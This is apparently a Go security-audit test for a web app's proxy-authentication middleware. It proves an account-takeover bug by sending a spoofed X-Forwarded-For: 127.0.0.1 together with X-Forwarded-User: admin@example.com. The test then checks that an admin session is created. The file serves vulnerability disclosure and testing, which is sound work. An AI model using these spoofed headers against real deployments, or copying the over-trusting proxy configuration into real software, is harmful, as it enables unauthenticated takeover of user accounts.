package middlewares_test

import (
	"context"
	"database/sql"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"testing"

	"github.com/gofiber/fiber/v3"
	_ "modernc.org/sqlite"

	"novelhub/internal/middlewares"
	"novelhub/internal/models"
	"novelhub/internal/repositories"
	"novelhub/pkg/cache"
	"novelhub/pkg/database"
)

func newAuditProxyTestDB(t *testing.T) (*sql.DB, error) {
	t.Helper()
	db, err := sql.Open("sqlite", filepath.Join(t.TempDir(), "audit_proxy.db"))
	if err != nil {
		return nil, err
	}
	t.Cleanup(func() { _ = db.Close() })
	if err := database.ApplySchema(db); err != nil {
		t.Fatal(err)
	}
	return db, nil
}

// serveAuditApp boots the app on a real 127.0.0.1 listener so the TCP peer is a
// loopback address — exactly the range server.go's TRUST_PROXY=true config
// (Loopback+Private+LinkLocal) treats as a trusted proxy.
func serveAuditApp(t *testing.T, app *fiber.App) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	go func() { _ = app.Listener(ln) }()
	return fmt.Sprintf("http://%s", ln.Addr().String())
}

// TestAuditProxyAuthTrustsSpoofableXFF proves task T1.1 end-to-end over a real
// TCP connection.
//
// server.go maps TRUST_PROXY=true to fiber.TrustProxyConfig{Loopback, Private,
// LinkLocal} and docker-compose.yml defaults TRUST_PROXY=${TRUST_PROXY:-true}.
// Any connection whose peer falls in those ranges is treated as a trusted
// proxy, so its X-Forwarded-For flows straight into c.IP(). The proxy-auth
// middleware then sees c.IP() == 127.0.0.1, matches the default TrustedProxies
// list, and honours X-Forwarded-User.
//
// In Docker's default port-mapping the peer is the bridge gateway (private
// range) — the same trust path, exercised here over loopback.
//
// PASSING = bug confirmed: an unauthenticated attacker spoofed the proxy
// identity and obtained a session as the target user.
func TestAuditProxyAuthTrustsSpoofableXFF(t *testing.T) {
	os.Setenv("JWT_SECRET", "test-secret")
	os.Setenv("JWT_REFRESH_SECRET", "test-refresh")

	db, err := newAuditProxyTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := db.Exec(`INSERT INTO roles (id, name, auto_assign) VALUES ('role-user', 'user', 1)`); err != nil {
		t.Fatal(err)
	}

	ramCache := cache.NewRamCache()
	userRepo := repositories.NewUserRepository(db, ramCache)
	roleRepo := repositories.NewRoleRepository(db, ramCache)

	mockSettings := &models.AdminSettings{
		ProxyAuth: models.ProxyAuthSettings{
			Enabled:        true,
			HeaderNames:    []string{"X-Forwarded-User"},
			TrustedProxies: []string{"127.0.0.1"}, // default list
			AutoCreate:     true,
		},
	}
	settingsSvc := &MockSettingsService{settings: mockSettings}
	authSvc := &MockAuthService{}

	// Replicate server.go's TRUST_PROXY=true fiber config.
	app := fiber.New(fiber.Config{
		TrustProxy:       true,
		TrustProxyConfig: fiber.TrustProxyConfig{Loopback: true, Private: true, LinkLocal: true},
		ProxyHeader:      fiber.HeaderXForwardedFor,
	})
	app.Use(middlewares.ProxyAuth(settingsSvc, authSvc, userRepo, roleRepo, database.NewTxManager(db)))
	app.Get("/test", func(c fiber.Ctx) error {
		return c.JSON(fiber.Map{"auth": c.Get("Authorization")})
	})
	baseURL := serveAuditApp(t, app)

	// Primitive: a loopback peer lets the attacker control c.IP().
	t.Run("trusted-range peer controls c.IP via X-Forwarded-For", func(t *testing.T) {
		prim := fiber.New(fiber.Config{
			TrustProxy:       true,
			TrustProxyConfig: fiber.TrustProxyConfig{Loopback: true, Private: true, LinkLocal: true},
			ProxyHeader:      fiber.HeaderXForwardedFor,
		})
		prim.Get("/ip", func(c fiber.Ctx) error { return c.SendString(c.IP()) })
		primBase := serveAuditApp(t, prim)

		req, _ := http.NewRequest(http.MethodGet, primBase+"/ip", nil)
		req.Header.Set("X-Forwarded-For", "127.0.0.1")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if got := string(body); got != "127.0.0.1" {
			t.Fatalf("c.IP() = %q; expected spoofed 127.0.0.1 via X-Forwarded-For from a trusted-range peer", got)
		}
	})

	// Full chain: spoofed XFF + X-Forwarded-User -> session as target.
	req, _ := http.NewRequest(http.MethodGet, baseURL+"/test", nil)
	req.Header.Set("X-Forwarded-For", "127.0.0.1")
	req.Header.Set("X-Forwarded-User", "admin@example.com")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status %d; expected 200 (request was not even authenticated)", resp.StatusCode)
	}

	// BUG PROOF: the attacker now holds a session for admin@example.com.
	u, err := userRepo.GetByEmail(context.Background(), "admin@example.com")
	if err != nil || u == nil {
		t.Fatalf("user admin@example.com was not auto-created from spoofed headers; the spoof did not land")
	}
	if resp.Header.Get("Set-Cookie") == "" {
		t.Fatal("no session cookies were set")
	}
}
